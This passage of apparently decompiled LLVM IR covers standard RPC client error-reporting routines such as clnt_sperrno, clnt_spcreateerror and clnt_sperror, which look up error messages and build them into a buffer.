  store i32 %v4_8066cfc, i32* %ecx.global-to-local, align 4
  %v1_8066d04 = add i32 %v4_8066cfc, 2
  %v2_8066d04 = inttoptr i32 %v1_8066d04 to i16*
  %v3_8066d04 = load i16, i16* %v2_8066d04, align 2
  %v4_8066d04 = zext i16 %v3_8066d04 to i32
  %v2_8066d08 = mul nuw i32 %v4_8066d04, 65536
  store i32 %v2_8066d08, i32* %eax.global-to-local, align 4
  %v1_8066d16 = add i32 %v4_8066cfc, 4
  %v2_8066d16 = inttoptr i32 %v1_8066d16 to i16*
  %v3_8066d16 = load i16, i16* %v2_8066d16, align 2
  %v4_8066d16 = zext i16 %v3_8066d16 to i32
  store i32 %v4_8066d16, i32* %eax.global-to-local, align 4
  %v2_8066d1a = load i16, i16* %arg1, align 2
  %v3_8066d1a = zext i16 %v2_8066d1a to i32
  store i32 %v3_8066d1a, i32* %ecx.global-to-local, align 4
  store i32 %v4_8066d16, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8066d26 = add i32 %v0_8066d3f, 16
  %v2_8066d26 = inttoptr i32 %v1_8066d26 to i32*
  %v3_8066d26 = load i32, i32* %v2_8066d26, align 4
  store i32 %v3_8066d1a, i32* %eax.global-to-local, align 4
  store i32 %v4_8066d16, i32* %edx.global-to-local, align 4
  %v2_8066d30 = or i32 %v3_8066d1a, %v2_8066d08
  store i32 %v2_8066d30, i32* %ecx.global-to-local, align 4
  %v4_8066d32 = mul i32 %v3_8066d26, %v4_8066d16
  %v1_8066d35 = add i32 %v0_8066d3f, 20
  %v2_8066d35 = inttoptr i32 %v1_8066d35 to i32*
  %v3_8066d35 = load i32, i32* %v2_8066d35, align 4
  store i32 %v2_8066d30, i32* %eax.global-to-local, align 4
  %v4_8066d3a = mul i32 %v3_8066d35, %v2_8066d30
  store i32 %v4_8066d3a, i32* %edx.global-to-local, align 4
  %v2_8066d3d = add i32 %v4_8066d3a, %v4_8066d32
  %v3_8066d3f = load i32, i32* %v2_8066d26, align 4
  %v5_8066d3f = zext i32 %v3_8066d3f to i64
  %v6_8066d3f = zext i32 %v2_8066d30 to i64
  %v7_8066d3f = mul nuw i64 %v5_8066d3f, %v6_8066d3f
  %v8_8066d3f = trunc i64 %v7_8066d3f to i32
  %v9_8066d3f = udiv i64 %v7_8066d3f, 4294967296
  %v10_8066d3f = trunc i64 %v9_8066d3f to i32
  store i32 %v8_8066d3f, i32* %eax.global-to-local, align 4
  store i32 %v10_8066d3f, i32* %edx.global-to-local, align 4
  store i32 %v8_8066d3f, i32* %ecx.global-to-local, align 4
  %v1_8066d44 = add i32 %v0_8066d3f, 12
  %v2_8066d44 = inttoptr i32 %v1_8066d44 to i16*
  %v3_8066d44 = load i16, i16* %v2_8066d44, align 2
  %v4_8066d44 = zext i16 %v3_8066d44 to i32
  %v2_8066d48 = add i32 %v10_8066d3f, %v2_8066d3d
  %v2_8066d4d = add i32 %v4_8066d44, %v8_8066d3f
  %v7_8066d4d = icmp ult i32 %v2_8066d4d, %v4_8066d44
  store i32 %v2_8066d4d, i32* %eax.global-to-local, align 4
  store i32 %v4_8066cfc, i32* %ecx.global-to-local, align 4
  %v3_8066d53 = zext i1 %v7_8066d4d to i32
  %v5_8066d53 = add i32 %v2_8066d48, %v3_8066d53
  store i32 %v5_8066d53, i32* %edx.global-to-local, align 4
  %v1_8066d55 = trunc i32 %v2_8066d4d to i16
  store i16 %v1_8066d55, i16* %arg1, align 2
  %v0_8066d58 = load i32, i32* %eax.global-to-local, align 4
  %v3_8066d58 = udiv i32 %v0_8066d58, 65536
  %v4_8066d58 = mul i32 %v5_8066d53, 65536
  %v5_8066d58 = or i32 %v4_8066d58, %v3_8066d58
  store i32 %v5_8066d58, i32* %eax.global-to-local, align 4
  %v2_8066d5c = udiv i32 %v5_8066d53, 65536
  store i32 %v2_8066d5c, i32* %edx.global-to-local, align 4
  %v1_8066d5f = trunc i32 %v3_8066d58 to i16
  %v2_8066d5f = load i32, i32* %ecx.global-to-local, align 4
  %v3_8066d5f = add i32 %v2_8066d5f, 2
  %v4_8066d5f = inttoptr i32 %v3_8066d5f to i16*
  store i16 %v1_8066d5f, i16* %v4_8066d5f, align 2
  %v0_8066d63 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066d63 = load i32, i32* %edx.global-to-local, align 4
  %v3_8066d63 = udiv i32 %v0_8066d63, 65536
  %v2_8066d67 = udiv i32 %v1_8066d63, 65536
  store i32 %v2_8066d67, i32* %edx.global-to-local, align 4
  %v1_8066d6a = trunc i32 %v3_8066d63 to i16
  %v2_8066d6a = load i32, i32* %ecx.global-to-local, align 4
  %v3_8066d6a = add i32 %v2_8066d6a, 4
  %v4_8066d6a = inttoptr i32 %v3_8066d6a to i16*
  store i16 %v1_8066d6a, i16* %v4_8066d6a, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_8066d44, { 1, 0 }
  uselistorder i32 %v2_8066d30, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8066d08, { 1, 0 }
  uselistorder i32 %v4_8066cfc, { 3, 0, 2, 1, 4 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 31, 30, 32, 34, 33, 36, 35, 38, 37, 39, 40, 42, 41, 44, 43, 45, 46, 48, 47 }
  uselistorder i32 65536, { 4, 5, 6, 2, 7, 3, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 19, 18, 21, 20, 23, 22, 24, 25, 149, 151, 27, 28, 26, 29, 147, 30, 31, 33, 32, 35, 34, 36, 37, 38, 42, 39, 43, 40, 44, 41, 48, 45, 49, 46, 50, 47, 51, 52, 54, 53, 55, 56, 57, 62, 58, 63, 59, 64, 60, 65, 61, 69, 66, 70, 67, 71, 68, 72, 74, 73, 76, 75, 78, 77, 79, 80, 81, 83, 82, 84, 87, 85, 88, 86, 90, 89, 92, 91, 94, 93, 95, 97, 96, 98, 99, 102, 100, 103, 101, 104, 107, 105, 108, 106, 110, 109, 111, 113, 112, 119, 114, 120, 115, 126, 127, 121, 116, 122, 123, 117, 124, 118, 125, 0, 1, 132, 128, 133, 129, 136, 134, 130, 137, 135, 131, 139, 146, 138, 140, 141, 143, 148, 142, 144, 145, 150 }
  uselistorder i16 1, { 3, 1, 4, 2, 0 }
  uselistorder i16 11, { 1, 2, 0 }
  uselistorder i32 20, { 130, 131, 118, 119, 120, 60, 15, 121, 19, 134, 59, 144, 132, 145, 146, 124, 26, 125, 42, 43, 44, 45, 46, 47, 48, 49, 50, 133, 61, 62, 63, 64, 65, 66, 67, 11, 51, 68, 69, 70, 71, 72, 122, 123, 23, 135, 136, 75, 16, 28, 73, 127, 74, 147, 53, 52, 54, 55, 137, 138, 139, 2, 140, 3, 141, 27, 142, 143, 148, 126, 81, 128, 76, 77, 78, 79, 80, 129, 150, 149, 29, 30, 31, 32, 33, 34, 35, 39, 36, 37, 38, 0, 40, 41, 12, 82, 56, 57, 58, 83, 14, 13, 84, 85, 86, 87, 88, 89, 90, 91, 24, 92, 93, 17, 25, 94, 95, 18, 4, 96, 97, 98, 5, 99, 100, 101, 6, 102, 7, 103, 104, 105, 106, 1, 8, 107, 108, 109, 9, 110, 111, 112, 10, 113, 114, 115, 116, 117, 20, 21, 22 }
  uselistorder i16 0, { 45, 0, 10, 46, 19, 1, 11, 2, 18, 47, 15, 48, 49, 8, 9, 12, 3, 13, 20, 21, 22, 23, 24, 16, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 14, 40, 41, 42, 43, 44, 4, 5, 6, 7, 17 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8066cfc, { 1, 0 }
}

define i32 @__GI_clnt_sperrno(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  br label %dec_label_pc_8066d80

dec_label_pc_8066d80:                             ; preds = %entry, %dec_label_pc_8066d96
  %v0_8066d968 = phi i32 [ 0, %entry ], [ %v1_8066d96, %dec_label_pc_8066d96 ]
  %v1_8066d80 = mul nuw nsw i32 %v0_8066d968, 8
  %v2_8066d80 = add i32 %v1_8066d80, ptrtoint (i32* @global_var_806e5e0.853 to i32)
  %v3_8066d80 = inttoptr i32 %v2_8066d80 to i32*
  %v4_8066d80 = load i32, i32* %v3_8066d80, align 8
  %v16_8066d80 = icmp eq i32 %v4_8066d80, %arg1
  %v1_8066d87 = icmp eq i1 %v16_8066d80, false
  br i1 %v1_8066d87, label %dec_label_pc_8066d96, label %dec_label_pc_8066d89

dec_label_pc_8066d89:                             ; preds = %dec_label_pc_8066d80
  %v2_8066d89 = add i32 %v1_8066d80, ptrtoint (i32* @global_var_806e5e4.854 to i32)
  %v3_8066d89 = inttoptr i32 %v2_8066d89 to i32*
  %v4_8066d89 = load i32, i32* %v3_8066d89, align 4
  %v1_8066d90 = add i32 %v4_8066d89, ptrtoint ([13 x i8]* @global_var_806e680.855 to i32)
  ret i32 %v1_8066d90

dec_label_pc_8066d96:                             ; preds = %dec_label_pc_8066d80
  %v1_8066d96 = add nuw nsw i32 %v0_8066d968, 1
  %tmp11 = icmp ult i32 %v1_8066d96, 18
  br i1 %tmp11, label %dec_label_pc_8066d80, label %dec_label_pc_8066d9c

dec_label_pc_8066d9c:                             ; preds = %dec_label_pc_8066d96
  ret i32 ptrtoint ([26 x i8]* @global_var_806e3db.856 to i32)

; uselistorder directives
  uselistorder i32 %v0_8066d968, { 1, 0 }
  uselistorder label %dec_label_pc_8066d80, { 1, 0 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  %v1_8066da5 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v1_8066dad = add i32 %v1_8066da5, 156
  %v2_8066dad = inttoptr i32 %v1_8066dad to i32*
  %v3_8066dad = load i32, i32* %v2_8066dad, align 4
  %v1_8066db3 = call i32 @free(i32 %v3_8066dad)
  ret i32 %v1_8066db3

; uselistorder directives
  uselistorder i32 (i32)* @free, { 63, 58, 65, 14, 13, 12, 11, 35, 34, 33, 32, 31, 30, 29, 28, 64, 61, 60, 59, 17, 57, 10, 66, 62, 16, 15, 9, 7, 6, 5, 4, 3, 2, 1, 8, 56, 55, 54, 53, 52, 51, 50, 49, 27, 26, 25, 24, 23, 37, 22, 21, 41, 40, 42, 20, 0, 39, 38, 19, 48, 47, 46, 45, 44, 43, 36, 18 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 4, 5, 6, 2, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 21, 20, 19, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52, 53, 43, 44, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 108, 106, 107, 104, 105, 98, 99, 100, 101, 102, 103, 111, 112, 109, 110, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148 }
}

define i32 @clnt_perrno(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8066dc0 = load i32, i32* @global_var_8074610, align 16
  store i32 %v0_8066dc0, i32* @ebx, align 4
  %v1_8066dca = call i32 @__GI_clnt_sperrno(i32 %arg1)
  %v0_8066dd0 = load i32, i32* @ebx, align 4
  %v2_8066dd2 = call i32 @__GI_fputs(i32 %v1_8066dca, i32 %v0_8066dd0)
  ret i32 %v2_8066dd2
}

define i32 @_buf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8066ddc = load i32, i32* @ebx, align 4
  store i32 %v0_8066ddc, i32* %stack_var_-4, align 4
  %v1_8066de0 = call i32 @__rpc_thread_variables(i32 %v0_8066ddc)
  store i32 %v1_8066de0, i32* @ebx, align 4
  %v1_8066de7 = add i32 %v1_8066de0, 156
  %v2_8066de7 = inttoptr i32 %v1_8066de7 to i32*
  %v3_8066de7 = load i32, i32* %v2_8066de7, align 4
  %v4_8066de7 = icmp eq i32 %v3_8066de7, 0
  %v1_8066dee = icmp eq i1 %v4_8066de7, false
  br i1 %v1_8066dee, label %dec_label_pc_8066e06, label %dec_label_pc_8066df0

dec_label_pc_8066df0:                             ; preds = %entry
  %v1_8066df8 = call i32 @malloc(i32 256)
  %v1_8066e00 = load i32, i32* @ebx, align 4
  %v2_8066e00 = add i32 %v1_8066e00, 156
  %v3_8066e00 = inttoptr i32 %v2_8066e00 to i32*
  store i32 %v1_8066df8, i32* %v3_8066e00, align 4
  %v0_8066e06.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8066e06

dec_label_pc_8066e06:                             ; preds = %entry, %dec_label_pc_8066df0
  %v0_8066e06 = phi i32 [ %v1_8066de0, %entry ], [ %v0_8066e06.pre, %dec_label_pc_8066df0 ]
  %v1_8066e06 = add i32 %v0_8066e06, 156
  %v2_8066e06 = inttoptr i32 %v1_8066e06 to i32*
  %v3_8066e06 = load i32, i32* %v2_8066e06, align 4
  %v2_8066e0c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8066e0c, i32* @ecx, align 4
  %v2_8066e0e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8066e0e, i32* @ebx, align 4
  ret i32 %v3_8066e06

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 40, 43, 4, 3, 2, 13, 12, 45, 44, 7, 42, 41, 39, 6, 5, 38, 0, 1, 46, 14, 11, 10, 32, 33, 25, 37, 36, 35, 34, 15, 31, 17, 30, 29, 28, 27, 26, 24, 23, 22, 21, 20, 19, 18, 16, 9, 8 }
  uselistorder i32 256, { 73, 1, 2, 3, 4, 62, 5, 6, 7, 8, 9, 10, 11, 12, 61, 13, 14, 15, 77, 74, 16, 17, 20, 18, 19, 21, 22, 23, 55, 56, 24, 57, 63, 25, 26, 78, 27, 28, 0, 58, 59, 67, 68, 60, 29, 30, 31, 32, 33, 34, 69, 70, 35, 36, 37, 38, 82, 39, 40, 41, 42, 43, 44, 45, 46, 64, 79, 71, 47, 48, 49, 50, 75, 51, 52, 53, 72, 65, 80, 76, 81, 66, 54 }
  uselistorder i32 156, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 (i32)* @__rpc_thread_variables, { 12, 17, 5, 16, 15, 14, 13, 11, 1, 3, 10, 2, 9, 0, 8, 4, 7, 6 }
  uselistorder label %dec_label_pc_8066e06, { 1, 0 }
}

define i32 @clnt_spcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-1040 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8066e10 = load i32, i32* @ebp, align 4
  %v0_8066e11 = load i32, i32* @edi, align 4
  %v0_8066e12 = load i32, i32* @esi, align 4
  %v0_8066e13 = load i32, i32* @ebx, align 4
  store i32 %v0_8066e13, i32* %stack_var_-16, align 4
  %v3_8066e1a = call i32 @_buf(i32 %v0_8066e13, i32 %v0_8066e12, i32 %v0_8066e11)
  store i32 %v3_8066e1a, i32* @ebp, align 4
  %v1_8066e21 = icmp eq i32 %v3_8066e1a, 0
  br i1 %v1_8066e21, label %dec_label_pc_8066ef5, label %dec_label_pc_8066e29

dec_label_pc_8066e29:                             ; preds = %entry
  %v0_8066e29 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_8066e29, i32* @edi, align 4
  %v3_8066e3e = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_806e3f5.857 to i32), i32 %arg1)
  %v0_8066e43 = load i32, i32* @edi, align 4
  %v1_8066e43 = inttoptr i32 %v0_8066e43 to i32*
  %v2_8066e43 = load i32, i32* %v1_8066e43, align 4
  %v0_8066e45 = load i32, i32* @ebp, align 4
  %v2_8066e45 = add i32 %v0_8066e45, %v3_8066e3e
  store i32 %v2_8066e45, i32* %ebx.global-to-local, align 4
  %v1_8066e49 = call i32 @__GI_clnt_sperrno(i32 %v2_8066e43)
  store i32 %v1_8066e49, i32* @eax, align 4
  %v5_8066e52 = inttoptr i32 %v2_8066e45 to i8*
  %v5_8066e53 = call i32 @strcpy(i8* %v5_8066e52, i32 %v1_8066e49)
  %v4_8066e58 = inttoptr i32 %v2_8066e45 to i8*
  %v3_8066e5b = call i32 @strlen(i8* %v4_8066e58)
  %v2_8066e63 = add i32 %v2_8066e45, %v3_8066e5b
  store i32 %v2_8066e63, i32* %ebx.global-to-local, align 4
  %v0_8066e65 = load i32, i32* @edi, align 4
  %v1_8066e65 = inttoptr i32 %v0_8066e65 to i32*
  %v2_8066e65 = load i32, i32* %v1_8066e65, align 4
  store i32 %v2_8066e65, i32* @eax, align 4
  %v9_8066e67 = icmp eq i32 %v2_8066e65, 12
  br i1 %v9_8066e67, label %dec_label_pc_8066eaa, label %dec_label_pc_8066e6c

dec_label_pc_8066e6c:                             ; preds = %dec_label_pc_8066e29
  %v9_8066e6c = icmp eq i32 %v2_8066e65, 14
  %v1_8066e6f = icmp eq i1 %v9_8066e6c, false
  br i1 %v1_8066e6f, label %dec_label_pc_8066eee, label %dec_label_pc_8066e71

dec_label_pc_8066e71:                             ; preds = %dec_label_pc_8066e6c
  %v5_8066e78 = inttoptr i32 %v2_8066e63 to i8*
  %v5_8066e79 = call i32 @strcpy(i8* %v5_8066e78, i32 ptrtoint ([4 x i8]* @global_var_806e3fa.858 to i32))
  %v0_8066e7e = load i32, i32* %ebx.global-to-local, align 4
  %v4_8066e7e = inttoptr i32 %v0_8066e7e to i8*
  %v3_8066e81 = call i32 @strlen(i8* %v4_8066e7e)
  %v0_8066e89 = load i32, i32* @edi, align 4
  %v1_8066e89 = add i32 %v0_8066e89, 4
  %v2_8066e89 = inttoptr i32 %v1_8066e89 to i32*
  %v3_8066e89 = load i32, i32* %v2_8066e89, align 4
  %v0_8066e8c = load i32, i32* %ebx.global-to-local, align 4
  %v3_8066e8c = add i32 %v0_8066e8c, %v3_8066e81
  store i32 %v3_8066e8c, i32* %ebx.global-to-local, align 4
  %v1_8066e8e = call i32 @__GI_clnt_sperrno(i32 %v3_8066e89)
  store i32 %v1_8066e8e, i32* @eax, align 4
  %v5_8066e95 = inttoptr i32 %v3_8066e8c to i8*
  %v5_8066e96 = call i32 @strcpy(i8* %v5_8066e95, i32 %v1_8066e8e)
  %v4_8066e9b = inttoptr i32 %v3_8066e8c to i8*
  %v3_8066e9e = call i32 @strlen(i8* %v4_8066e9b)
  %v3_8066ea6 = add i32 %v3_8066e8c, %v3_8066e9e
  store i32 %v3_8066ea6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8066eee

dec_label_pc_8066eaa:                             ; preds = %dec_label_pc_8066e29
  %v5_8066eb1 = inttoptr i32 %v2_8066e63 to i8*
  %v5_8066eb2 = call i32 @strcpy(i8* %v5_8066eb1, i32 ptrtoint ([4 x i8]* @global_var_806e3fa.858 to i32))
  %v0_8066eb7 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8066eb7 = inttoptr i32 %v0_8066eb7 to i8*
  %v3_8066eba = call i32 @strlen(i8* %v4_8066eb7)
  %v2_8066ec7 = add i32 %v0_8066eb7, %v3_8066eba
  store i32 %v2_8066ec7, i32* @esi, align 4
  %v2_8066eca = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v2_8066eca, i32* @ebx, align 4
  %v0_8066ecf = load i32, i32* @edi, align 4
  %v1_8066ecf = add i32 %v0_8066ecf, 8
  %v2_8066ecf = inttoptr i32 %v1_8066ecf to i32*
  %v3_8066ecf = load i32, i32* %v2_8066ecf, align 4
  %v5_8066ed2 = call i32 @__GI___glibc_strerror_r(i32 %v3_8066ecf, i32 %v2_8066eca, i32 1024)
  %v3_8066ed8 = ptrtoint i32* %stack_var_-1040 to i32
  store i32 %v3_8066ed8, i32* @eax, align 4
  %v0_8066eda = load i32, i32* @esi, align 4
  %v5_8066eda = inttoptr i32 %v0_8066eda to i8*
  %v5_8066edb = call i32 @strcpy(i8* %v5_8066eda, i32 %v2_8066eca)
  %v0_8066ee0 = load i32, i32* @esi, align 4
  %v4_8066ee0 = inttoptr i32 %v0_8066ee0 to i8*
  %v3_8066ee3 = call i32 @strlen(i8* %v4_8066ee0)
  %v0_8066eeb = load i32, i32* @esi, align 4
  %v2_8066eeb = add i32 %v0_8066eeb, %v3_8066ee3
  store i32 %v2_8066eeb, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8066eee

dec_label_pc_8066eee:                             ; preds = %dec_label_pc_8066e6c, %dec_label_pc_8066e71, %dec_label_pc_8066eaa
  %v0_8066eee = phi i32 [ %v2_8066e63, %dec_label_pc_8066e6c ], [ %v3_8066ea6, %dec_label_pc_8066e71 ], [ %v2_8066eeb, %dec_label_pc_8066eaa ]
  %v1_8066eee = inttoptr i32 %v0_8066eee to i8*
  store i8 10, i8* %v1_8066eee, align 1
  %v0_8066ef1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066ef1 = add i32 %v0_8066ef1, 1
  %v2_8066ef1 = inttoptr i32 %v1_8066ef1 to i8*
  store i8 0, i8* %v2_8066ef1, align 1
  %v0_8066efb.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8066ef5

dec_label_pc_8066ef5:                             ; preds = %entry, %dec_label_pc_8066eee
  %v0_8066efb = phi i32 [ 0, %entry ], [ %v0_8066efb.pre, %dec_label_pc_8066eee ]
  %v2_8066efd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8066efd, i32* @ebx, align 4
  store i32 %v0_8066e12, i32* @esi, align 4
  store i32 %v0_8066e11, i32* @edi, align 4
  store i32 %v0_8066e10, i32* @ebp, align 4
  ret i32 %v0_8066efb

; uselistorder directives
  uselistorder i32 %v2_8066eca, { 1, 0, 2 }
  uselistorder i32 %v3_8066e8c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8066e45, { 1, 0, 2, 3 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8066ef5, { 1, 0 }
  uselistorder label %dec_label_pc_8066eee, { 2, 1, 0 }
}

define i32 @clnt_pcreateerror(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8066f06 = load i32, i32* @global_var_8074610, align 16
  store i32 %v0_8066f06, i32* @ebx, align 4
  %v1_8066f10 = call i32 @clnt_spcreateerror(i32 %arg1)
  store i32 %arg1, i32* @edx, align 4
  %v0_8066f17 = load i32, i32* @ebx, align 4
  %v2_8066f19 = call i32 @__GI_fputs(i32 %v1_8066f10, i32 %v0_8066f17)
  ret i32 %v2_8066f19
}

define i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1056 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8066f24 = load i32, i32* @edi, align 4
  %v0_8066f25 = load i32, i32* @esi, align 4
  %v0_8066f26 = load i32, i32* @ebx, align 4
  store i32 %v0_8066f26, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8066f34 = call i32 @_buf(i32 %v0_8066f26, i32 %v0_8066f25, i32 %v0_8066f24)
  store i32 %v3_8066f34, i32* @ebp, align 4
  %v2_8066f3d = icmp eq i32 %v3_8066f34, 0
  br i1 %v2_8066f3d, label %dec_label_pc_806708b, label %dec_label_pc_8066f45

dec_label_pc_8066f45:                             ; preds = %entry
  %v0_8066f47 = load i32, i32* @ebx, align 4
  %v1_8066f47 = add i32 %v0_8066f47, 4
  %v2_8066f47 = inttoptr i32 %v1_8066f47 to i32*
  %v3_8066f47 = load i32, i32* %v2_8066f47, align 4
  %v7_8066f53 = add i32 %v3_8066f47, 8
  %v8_8066f53 = inttoptr i32 %v7_8066f53 to i32*
  %v9_8066f53 = load i32, i32* %v8_8066f53, align 4
  call void @__pseudo_call(i32 %v9_8066f53)
  %v3_8066f66 = call i32 @sprintf(i32 ptrtoint ([5 x i8]* @global_var_806e3f5.857 to i32), i32 %arg1)
  %v3_8066f72 = add i32 %v3_8066f66, %v3_8066f34
  store i32 %v3_8066f72, i32* @ebx, align 4
  %v1_8066f76 = call i32 @__GI_clnt_sperrno(i32 %tmp18)
  store i32 %v1_8066f76, i32* @eax, align 4
  %v0_8066f7f = load i32, i32* @ebx, align 4
  %v5_8066f7f = inttoptr i32 %v0_8066f7f to i8*
  %v5_8066f80 = call i32 @strcpy(i8* %v5_8066f7f, i32 %v1_8066f76)
  %v0_8066f85 = load i32, i32* @ebx, align 4
  %v4_8066f85 = inttoptr i32 %v0_8066f85 to i8*
  %v3_8066f88 = call i32 @strlen(i8* %v4_8066f85)
  %v0_8066f98 = load i32, i32* @ebx, align 4
  %v2_8066f98 = add i32 %v0_8066f98, %v3_8066f88
  store i32 %v2_8066f98, i32* @esi, align 4
  switch i32 %tmp18, label %dec_label_pc_8067064 [
    i32 0, label %dec_label_pc_8067082
    i32 1, label %dec_label_pc_8067082
    i32 2, label %dec_label_pc_8067082
    i32 3, label %dec_label_pc_8066faf
    i32 4, label %dec_label_pc_8066faf
    i32 5, label %dec_label_pc_8067082
    i32 6, label %dec_label_pc_806704f
    i32 7, label %dec_label_pc_8066fe3
    i32 8, label %dec_label_pc_8067082
    i32 9, label %dec_label_pc_806704f
    i32 10, label %dec_label_pc_8067082
    i32 11, label %dec_label_pc_8067082
    i32 12, label %dec_label_pc_8067082
    i32 13, label %dec_label_pc_8067082
    i32 14, label %dec_label_pc_8067082
    i32 15, label %dec_label_pc_8067082
    i32 16, label %dec_label_pc_8067082
    i32 17, label %dec_label_pc_8067082
  ]

dec_label_pc_8066faf:                             ; preds = %dec_label_pc_8066f45, %dec_label_pc_8066f45
  %v2_8066fb5 = ptrtoint i32* %stack_var_-1056 to i32
  store i32 %v2_8066fb5, i32* @ebx, align 4
  %v3_8066fba = load i32, i32* %stack_var_-28, align 4
  %v5_8066fc1 = call i32 @__GI___glibc_strerror_r(i32 %v3_8066fba, i32 %v2_8066fb5, i32 1024)
  %v0_8067077.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8067077

dec_label_pc_8066fd4:                             ; preds = %dec_label_pc_8066fee
  %v2_8066fd4 = add i32 %v1_8066fee, ptrtoint (i32* @global_var_806e4c4.861 to i32)
  %v3_8066fd4 = inttoptr i32 %v2_8066fd4 to i32*
  %v4_8066fd4 = load i32, i32* %v3_8066fd4, align 4
  %v1_8066fdb = add i32 %v4_8066fd4, ptrtoint ([18 x i8]* @global_var_806e500.862 to i32)
  br label %dec_label_pc_8066fff

dec_label_pc_8066fe3:                             ; preds = %dec_label_pc_8066f45
  %v3_8066fe3 = load i32, i32* %stack_var_-28, align 4
  store i32 0, i32* @eax, align 4
  br label %dec_label_pc_8066fee

dec_label_pc_8066fee:                             ; preds = %dec_label_pc_8066fe3, %dec_label_pc_8066ff7
  %v0_8066fff39 = phi i32 [ 0, %dec_label_pc_8066fe3 ], [ %v1_8066ff7, %dec_label_pc_8066ff7 ]
  %v1_8066fee = mul nuw nsw i32 %v0_8066fff39, 8
  %v2_8066fee = add i32 %v1_8066fee, ptrtoint (i32* @global_var_806e4c0.863 to i32)
  %v3_8066fee = inttoptr i32 %v2_8066fee to i32*
  %v4_8066fee = load i32, i32* %v3_8066fee, align 8
  %v16_8066fee = icmp eq i32 %v4_8066fee, %v3_8066fe3
  br i1 %v16_8066fee, label %dec_label_pc_8066fd4, label %dec_label_pc_8066ff7

dec_label_pc_8066ff7:                             ; preds = %dec_label_pc_8066fee
  %v1_8066ff7 = add nuw nsw i32 %v0_8066fff39, 1
  store i32 %v1_8066ff7, i32* @eax, align 4
  %tmp = icmp ult i32 %v1_8066ff7, 8
  br i1 %tmp, label %dec_label_pc_8066fee, label %dec_label_pc_8066ffd

dec_label_pc_8066ffd:                             ; preds = %dec_label_pc_8066ff7
  br label %dec_label_pc_8066fff

dec_label_pc_8066fff:                             ; preds = %dec_label_pc_8066fd4, %dec_label_pc_8066ffd
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8066ffd ], [ %v1_8066fdb, %dec_label_pc_8066fd4 ]
  store i32 %storemerge5, i32* @edi, align 4
  %v5_8067006 = inttoptr i32 %v2_8066f98 to i8*
  %v5_8067007 = call i32 @strcpy(i8* %v5_8067006, i32 ptrtoint ([9 x i8]* @global_var_806e433.864 to i32))
  %v0_806700c = load i32, i32* @esi, align 4
  %v4_806700c = inttoptr i32 %v0_806700c to i8*
  %v3_806700f = call i32 @strlen(i8* %v4_806700c)
  store i32 %v3_806700f, i32* @eax, align 4
  %v0_8067017 = load i32, i32* @edi, align 4
  %v1_8067017 = icmp eq i32 %v0_8067017, 0
  %v0_8067019 = load i32, i32* @esi, align 4
  %v2_8067019 = add i32 %v0_8067019, %v3_806700f
  store i32 %v2_8067019, i32* @ebx, align 4
  br i1 %v1_8067017, label %dec_label_pc_8067037, label %dec_label_pc_806701e

dec_label_pc_806701e:                             ; preds = %dec_label_pc_8066fff
